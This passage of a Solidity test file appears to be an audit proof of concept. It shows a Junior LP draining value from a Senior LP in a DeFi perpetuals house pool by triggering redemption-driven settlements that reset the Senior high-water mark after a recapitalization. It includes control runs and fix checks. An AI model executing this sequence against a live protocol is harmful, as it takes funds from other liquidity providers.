            + _usdgOf(address(d.juniorVault)) + _usdgOf(address(d.engine));
    }

}


/// @notice After a terminal deficit, the part of an owner recapitalization that the deficit absorbs stays in
///         pendingRecapitalizationAssets. The next mark-fresh reconcile at an unchanged mark caps that residual at the whole
///         distributable value and reserves it, although that value already backs the Senior principal the first
///         reconcile assigned from the same recapitalization. The waterfall sees a shortfall equal to Senior
///         principal, wipes it, and bootstraps Senior again with the residual as the new high-water mark.
///
///         Both tests use the release deployment script (script/DeployPerpsArbitrumSepolia.s.sol).
///         - test_recapResidualResetsSeniorHighWaterMark: one snapshot, a control and an attack with the same mark
///           prices and timestamps. In the control nobody queues an LP request while the basket stays depressed, so no
///           settlement can run until the recovery settlement; in the attack a wiped Junior holder makes 2 refunded all-share redemption
///           requests, so 2 more permissionless settlements run at the depressed mark first. Both sequences then let the
///           remaining traders close, both LPs request redemption of their wallet shares, and funded cash is claimed.
///         - test_followUpRecapitalization: after the first settlement the owner recapitalizes the gap between Senior
///           principal and its high-water mark.
///
///         Unset EXPECT_FIX: the tests check the defect at the audit commit. EXPECT_FIX=true: the tests check the
///         corrected behaviour of a fixed HousePool (not included).
contract RecapResidualHwmResetTest is ReleaseFixture {

    address internal slp = makeAddr("seniorLp");
    address internal jlp = makeAddr("juniorLpAttacker");
    address internal A = makeAddr("traderA");
    address internal B = makeAddr("traderB");
    address internal Lz = makeAddr("traderLz");
    address internal H = makeAddr("traderH");
    address internal X = makeAddr("traderX");

    uint256[] internal sRids; // Senior LP redemption requests
    uint256[] internal jRids; // attacker Junior redemption requests

    uint256 internal constant DOWN = 30_000_000; // basket 0.30
    uint256 internal constant UP = 199_000_000; // basket 1.99

    struct Party {
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 seniorHwm;
        uint256 pendingRecap;
        uint256 seniorLpValue; // convertToAssets of the Senior LP's shares
        uint256 attackerJuniorValue; // attacker's whole Junior position, see _attackerJuniorPosition
        uint256 juniorSeedValue; // owner's permanent 1 USDG Junior seed
        uint256 seniorEscrow; // funded Senior redemption assets held by the Senior vault
        uint256 unassigned;
    }

    function _party() internal view returns (Party memory p) {
        p.seniorPrincipal = d.housePool.seniorPrincipal();
        p.juniorPrincipal = d.housePool.juniorPrincipal();
        p.seniorHwm = d.housePool.seniorHighWaterMark();
        p.pendingRecap = d.housePool.pendingRecapitalizationAssets();
        p.seniorLpValue = d.seniorVault.convertToAssets(d.seniorVault.balanceOf(slp));
        p.attackerJuniorValue = _attackerJuniorPosition();
        p.juniorSeedValue = d.juniorVault.convertToAssets(d.juniorVault.balanceOf(owner));
        p.seniorEscrow = d.seniorVault.withdrawalEscrowAssets();
        p.unassigned = d.housePool.unassignedAssets();
    }

    function _log(
        string memory label,
        Party memory p
    ) internal pure {
        console2.log(label);
        console2.log("   seniorPrincipal / juniorPrincipal ", p.seniorPrincipal, p.juniorPrincipal);
        console2.log("   seniorHighWaterMark / pendingRecap", p.seniorHwm, p.pendingRecap);
    }

    /// @dev The attacker is the only Junior owner besides the owner's seed. Its position is its wallet shares, the
    ///      shares escrowed in its own redemption requests (the 95% request was only partly funded), and any funded
    ///      Junior redemption USDG not yet claimed.
    function _attackerJuniorPosition() internal view returns (uint256) {
        uint256 nonSeedShares = d.juniorVault.totalSupply() - d.juniorVault.balanceOf(owner);
        return d.juniorVault.convertToAssets(nonSeedShares) + d.juniorVault.withdrawalEscrowAssets();
    }

    function _equity() internal view returns (int256) {
        return int256(d.housePool.totalAssets()) - int256(d.engine.totalTraderClaimBalanceAssets())
            + d.engine.terminalNavSnapshot().terminalLpPriceDeltaAssets;
    }

    function _open(
        address t,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        _requireExecuted(_openPosition(t, side, size, margin, BASKET_1_20), "open");
        _warp(5);
        _refreshMark(BASKET_1_20);
    }

    /// @dev Public calls only. LPs fund the pool, traders open a balanced book, Junior redeems down to the withdrawal
    ///      firewall, then the basket moves 1.20 -> 0.30 -> 1.99: the LONG in profit at 0.30 closes for cash, B takes the
    ///      remaining cash at 1.99, and H and X close with unpaid claims: terminal equity < 0, both tranches wiped, degraded mode latched.
    function _buildDeficit() internal {
        _lpDeposit(false, jlp, 200_000e6, BASKET_1_20);
        _lpDeposit(true, slp, 30_000e6, BASKET_1_20);
        _fundTrader(A, 2_000e6);
        _fundTrader(Lz, 40_000e6);
        _fundTrader(B, 52_000e6);
        _fundTrader(H, 30_000e6);
        _fundTrader(X, 30_000e6);
        _open(A, CfdTypes.Side.LONG, 30_000e18, 1_000e6);
        _open(B, CfdTypes.Side.SHORT, 50_000e18, 50_000e6);
        _open(Lz, CfdTypes.Side.LONG, 40_000e18, 38_000e6);
        _open(H, CfdTypes.Side.SHORT, 27_500e18, 28_000e6);
        _open(X, CfdTypes.Side.SHORT, 27_500e18, 28_000e6);

        _warp(3_700);
        _refreshMark(BASKET_1_20);
        uint256 rid = _requestRedeem(false, jlp, d.juniorVault.balanceOf(jlp) * 95 / 100);
        jRids.push(rid);
        _settleEpoch(rid, BASKET_1_20);
        _claimRedeem(false, jlp, rid);

        _warp(30);
        _refreshMark(DOWN);
        _requireExecuted(_closePosition(A, CfdTypes.Side.LONG, 30_000e18, DOWN), "A close");
        _warp(30);
        _refreshMark(UP);
        _requireExecuted(_closePosition(B, CfdTypes.Side.SHORT, 50_000e18, UP), "B close");
        _requireExecuted(_closePosition(H, CfdTypes.Side.SHORT, 27_500e18, UP), "H close");
        _requireExecuted(_closePosition(X, CfdTypes.Side.SHORT, 15_000e18, UP), "X partial close");
    }

    /// @dev One hourly cycle by the attacker: request redemption of all its Junior shares, let the permissionless
    ///      Router settlement run, and take the refund (Junior principal is zero, so the redemption quotes zero).
    function _juniorCycle(
        uint256 price
    ) internal {
        _warp(3_600);
        _refreshMark(price);
        uint256 rid = _requestRedeem(false, jlp, d.juniorVault.balanceOf(jlp));
        _settleEpoch(rid, price);
        if (d.juniorVault.refundableRedeemRequest(rid, jlp) > 0) {
            vm.prank(jlp);
            d.juniorVault.claimRedeemRefund(rid, jlp, jlp);
        }
    }

    /// @dev Senior LP redeems 2,000 USDG of shares at the recovery mark (a settlement both sequences run).
    function _seniorRedeem(
        uint256 price
    ) internal {
        _warp(3_600);
        _refreshMark(price);
        uint256 rid = _requestRedeem(true, slp, d.seniorVault.convertToShares(2_000e6));
        sRids.push(rid);
        _settleEpoch(rid, price);
    }

    /// @dev Claim every funded redemption and every refund of both LPs.
    function _claimAll() internal {
        for (uint256 i; i < sRids.length; ++i) {
            uint256 c = d.seniorVault.claimableRedeemRequest(sRids[i], slp);
            if (c > 0) {
                vm.prank(slp);
                d.seniorVault.claimRedeem(sRids[i], c, slp, slp);
            }
        }
        for (uint256 i; i < jRids.length; ++i) {
            uint256 c = d.juniorVault.claimableRedeemRequest(jRids[i], jlp);
            if (c > 0) {
                vm.prank(jlp);
                d.juniorVault.claimRedeem(jRids[i], c, jlp, jlp);
            }
            if (d.juniorVault.refundableRedeemRequest(jRids[i], jlp) > 0) {
                vm.prank(jlp);
                d.juniorVault.claimRedeemRefund(jRids[i], jlp, jlp);
            }
        }
    }

    /// @dev Both sequences: the two remaining traders close at 1.20, then both LPs request redemption of their wallet
    ///      shares in the next hourly settlement and claim funded cash. Returns their USDG wallet balances.
    function _cashOut() internal returns (uint256 slpUsdg, uint256 attackerUsdg) {
        _warp(60);
        _refreshMark(BASKET_1_20);
        _requireExecuted(_closePosition(Lz, CfdTypes.Side.LONG, 40_000e18, BASKET_1_20), "Lz close");
        _requireExecuted(_closePosition(X, CfdTypes.Side.SHORT, 12_500e18, BASKET_1_20), "X close");
        _claimAll();
        _warp(3_600);
        _refreshMark(BASKET_1_20);
        uint256 rid = _requestRedeem(true, slp, d.seniorVault.balanceOf(slp));
        sRids.push(rid);
        jRids.push(_requestRedeem(false, jlp, d.juniorVault.balanceOf(jlp)));
        _settleEpoch(rid, BASKET_1_20);
        _claimAll();
        assertEq(d.seniorVault.balanceOf(slp), 0, "Senior LP fully redeemed");
        assertEq(d.seniorVault.pendingRedeemEscrowShares(), 0, "Senior LP has no queued redemption shares");
        slpUsdg = d.settlementToken.balanceOf(slp);
        attackerUsdg = d.settlementToken.balanceOf(jlp);
    }

    function test_recapResidualResetsSeniorHighWaterMark() public {
        _buildDeficit();
        _warp(5);
        _refreshMark(DOWN);
        int256 equity = _equity();
        require(equity < 0, "no terminal deficit");
        uint256 deficit = uint256(-equity);
        (uint256 maxProfitLong,,,) = d.engine.sides(0);
        uint256 P = d.housePool.totalAssets();
        uint256 C = d.engine.totalTraderClaimBalanceAssets();
        assertTrue(d.engine.degradedMode(), "degraded mode latched");
        assertGt(deficit, 0, "signed terminal equity below zero: both tranches are wiped at the next fresh reconcile");

        // Documented owner recovery: recapitalize the minimum that lets clearDegradedMode pass (+1,000 USDG), then clear.
        uint256 R = maxProfitLong + C - P + 1_000e6;
        _mint(owner, R);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.engine), R);
        d.engine.recapitalizePool(R);
        d.engine.clearDegradedMode();
        vm.stopPrank();
        console2.log("terminal deficit D at the depressed mark      ", deficit);
        console2.log("owner recapitalization R                  ", R);
        console2.log("unpaid trader claims C at the depressed mark", C);

        // First fresh reconcile after the recapitalization (both sequences).
        _juniorCycle(DOWN);
        Party memory p1 = _party();
        _log("after settlement #1 at the depressed mark", p1);
        assertEq(p1.seniorHwm, R, "documented bootstrap: HWM = full recapitalization intent");
        assertEq(p1.juniorPrincipal, 0, "Junior wiped");
        assertEq(p1.pendingRecap, deficit, "residual = the part of R the deficit absorbs");
        uint256 P1 = d.housePool.totalAssets();
        uint256 C1 = d.engine.totalTraderClaimBalanceAssets();
        uint256 attackerWallet0 = d.settlementToken.balanceOf(jlp);
        uint256 slpWallet0 = d.settlementToken.balanceOf(slp);

        uint256 snap = vm.snapshotState();

        // ---- control: refresh the same depressed mark at the two times used by the attack. Without a Junior
        // request, each attempted settlement reverts with its reconcile and the HWM stays at R.
        uint256[2] memory controlTimes;
        for (uint256 i; i < 2; ++i) {
            _warp(7_200);
            _refreshMark(DOWN);
            controlTimes[i] = vm.getBlockTimestamp();
            vm.prank(keeper);
            vm.expectRevert(abi.encodeWithSignature("HousePool__NoLpEpochProgress()"));
            d.router.settleLpEpoch(_updateData());
            assertEq(_party().seniorHwm, p1.seniorHwm, "control: HWM unchanged without a progressing settlement");
        }
        _seniorRedeem(BASKET_1_20);
        Party memory b = _party();
        uint256 tHonest = vm.getBlockTimestamp();
        _log("CONTROL after recovery", b);
        (uint256 bSlpUsdg, uint256 bAttackerUsdg) = _cashOut();

        vm.revertToState(snap);

        // ---- attack: two more settlements at the unchanged depressed mark, then the same recovery settlement
        _juniorCycle(DOWN);
        assertEq(vm.getBlockTimestamp(), controlTimes[0], "same second depressed-mark time in both sequences");
        Party memory a2 = _party();
        _log("ATTACK after settlement #2 at the depressed mark", a2);
        assertEq(d.housePool.totalAssets(), P1, "pool assets unchanged since settlement #1");
        assertEq(d.engine.totalTraderClaimBalanceAssets(), C1, "trader claims unchanged since settlement #1");
        assertEq(a2.seniorPrincipal, p1.seniorPrincipal, "Senior principal unchanged");
        bool expectFix = vm.envOr("EXPECT_FIX", false);
        if (expectFix) {
            assertEq(a2.seniorHwm, p1.seniorHwm, "fix: HWM kept at an unchanged state");
        } else {
            assertLt(a2.seniorHwm, p1.seniorHwm, "HWM lowered with no loss and no new inflow");
        }
        _juniorCycle(DOWN);
        assertEq(vm.getBlockTimestamp(), controlTimes[1], "same third depressed-mark time in both sequences");
        _log("ATTACK after settlement #3 at the depressed mark", _party());
        _seniorRedeem(BASKET_1_20);
        Party memory a = _party();
        _log("ATTACK after recovery", a);
        assertEq(vm.getBlockTimestamp(), tHonest, "same timestamps in both sequences");
        (uint256 aSlpUsdg, uint256 aAttackerUsdg) = _cashOut();

        uint256 seniorHonest = b.seniorPrincipal + b.seniorEscrow;
        uint256 seniorAttack = a.seniorPrincipal + a.seniorEscrow;
        console2.log("--- attack minus control");
        console2.log("Senior tranche (principal + funded escrow) control / attack", seniorHonest, seniorAttack);
        console2.log("Junior principal                           control / attack", b.juniorPrincipal, a.juniorPrincipal);
        console2.log("Senior LP share value delta");
        console2.logInt(int256(a.seniorLpValue) - int256(b.seniorLpValue));
        console2.log("Attacker Junior position value delta");
        console2.logInt(int256(a.attackerJuniorValue) - int256(b.attackerJuniorValue));
        console2.log("Owner Junior seed value delta");
        console2.logInt(int256(a.juniorSeedValue) - int256(b.juniorSeedValue));
        console2.log("--- final LP settlement and cash claims (traders closed)");
        console2.log("Senior LP USDG received  control / attack", bSlpUsdg - slpWallet0, aSlpUsdg - slpWallet0);
        console2.log("Attacker USDG received   control / attack", bAttackerUsdg - attackerWallet0, aAttackerUsdg - attackerWallet0);
        console2.log("Senior LP USDG delta (attack - control)");
        console2.logInt(int256(aSlpUsdg) - int256(bSlpUsdg));
        console2.log("Attacker USDG delta (attack - control)");
        console2.logInt(int256(aAttackerUsdg) - int256(bAttackerUsdg));

        if (expectFix) {
            assertEq(a.juniorPrincipal, b.juniorPrincipal, "fix: Junior equal in both sequences");
            assertEq(a.seniorPrincipal + a.seniorEscrow, b.seniorPrincipal + b.seniorEscrow, "fix: Senior equal in both sequences");
            assertEq(aAttackerUsdg, bAttackerUsdg, "fix: attacker withdraws the same in both sequences");
            assertApproxEqAbs(aSlpUsdg, bSlpUsdg, 1e6, "fix: Senior LP withdraws the same in both sequences (1 USDG)");
            assertEq(bAttackerUsdg, attackerWallet0, "fix: wiped Junior shares redeem for nothing");
            assertGt(bSlpUsdg - slpWallet0, 48_000e6, "fix: Senior LP is not locked out of its recovered principal");
            return;
        }
        assertEq(b.juniorPrincipal, 0, "control: Senior is still below its HWM, Junior gets nothing");
        assertLt(b.seniorPrincipal, b.seniorHwm, "control: Senior still impaired");
        assertEq(seniorAttack + a.juniorPrincipal + a.unassigned, seniorHonest + b.juniorPrincipal + b.unassigned,
            "same total LP equity in both sequences");
        assertGt(a.juniorPrincipal, 0, "attack: recovery revenue reaches Junior principal");
        assertLt(a.seniorLpValue, b.seniorLpValue, "Senior LP loses");
        assertGt(a.attackerJuniorValue, b.attackerJuniorValue, "attacker's wiped Junior position gains");
        assertApproxEqAbs(a.attackerJuniorValue - b.attackerJuniorValue, b.seniorLpValue - a.seniorLpValue, 1e6,
            "attacker gain matches the Senior LP loss within 1 USDG");
        assertEq(bAttackerUsdg, attackerWallet0, "control: the wiped Junior shares redeem for nothing");
        assertGt(aAttackerUsdg, bAttackerUsdg, "attack: attacker withdraws USDG");
        assertApproxEqAbs(aAttackerUsdg - bAttackerUsdg, bSlpUsdg - aSlpUsdg, 1e6,
            "attacker's withdrawn USDG matches the Senior LP's shortfall within 1 USDG");
    }


    /// @dev After the first post-recapitalization settlement the owner recapitalizes the gap between Senior principal and
    ///      its high-water mark. By design Senior is restored to R, and recovery revenue above R goes to Junior
    ///      (ACCOUNTING_SPEC.md:338).
    function test_followUpRecapitalization() public {
        _buildDeficit();
        _warp(5);
        _refreshMark(DOWN);
        (uint256 maxProfitLong,,,) = d.engine.sides(0);
        uint256 R = maxProfitLong + d.engine.totalTraderClaimBalanceAssets() - d.housePool.totalAssets() + 1_000e6;
        _mint(owner, R);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.engine), R);
        d.engine.recapitalizePool(R);
        d.engine.clearDegradedMode();
        vm.stopPrank();
        _juniorCycle(DOWN);
        uint256 gap = d.housePool.seniorHighWaterMark() - d.housePool.seniorPrincipal();
        _mint(owner, gap);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.engine), gap);
        d.engine.recapitalizePool(gap);
        vm.stopPrank();
        console2.log("FOLLOW-UP: R / gap recapitalized", R, gap);
        _juniorCycle(DOWN);
        _log("FOLLOW-UP after the next settlement", _party());
        uint256 hwmAfterFollowUp = d.housePool.seniorHighWaterMark();
        _juniorCycle(DOWN);
        _log("FOLLOW-UP after one more settlement", _party());
        _seniorRedeem(BASKET_1_20);
        Party memory r = _party();
        _log("FOLLOW-UP after recovery", r);
        console2.log("   unassignedAssets", r.unassigned);
        (uint256 slpUsdg, uint256 jUsdg) = _cashOut();
        console2.log("FOLLOW-UP final cash claims: Senior LP USDG / Junior holder USDG", slpUsdg, jUsdg);
        if (vm.envOr("EXPECT_FIX", false)) {
            assertEq(hwmAfterFollowUp, R, "fix: the follow-up recapitalization keeps the high-water mark at R");
            assertGt(r.juniorPrincipal, 0, "fix: recovery revenue above R reaches Junior");
            assertEq(r.unassigned, 0, "fix: no recovery revenue becomes unassigned");
        } else {
            assertGt(hwmAfterFollowUp, R, "defect: the follow-up recapitalization raises the high-water mark above R");
            assertEq(r.seniorPrincipal, r.seniorHwm, "defect: Senior takes recovery revenue up to the raised mark");
        }
    }

}
```

